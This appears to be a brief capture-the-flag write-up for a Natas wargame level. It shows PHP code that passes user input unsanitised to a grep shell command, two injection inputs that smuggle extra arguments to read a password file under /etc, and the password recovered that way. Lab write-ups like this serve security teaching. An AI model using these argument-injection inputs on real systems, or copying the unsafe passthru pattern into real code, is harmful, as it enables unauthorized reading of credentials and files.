```php
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```

Either comment out `dictionary.txt` or exploit the fact that `grep` can be used to search multiple files.
- `-E "\w+" /etc/natas_webpass/natas11 #`
- `g /etc/natas_webpass/natas11` (search for a random letter `g`)

```
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```
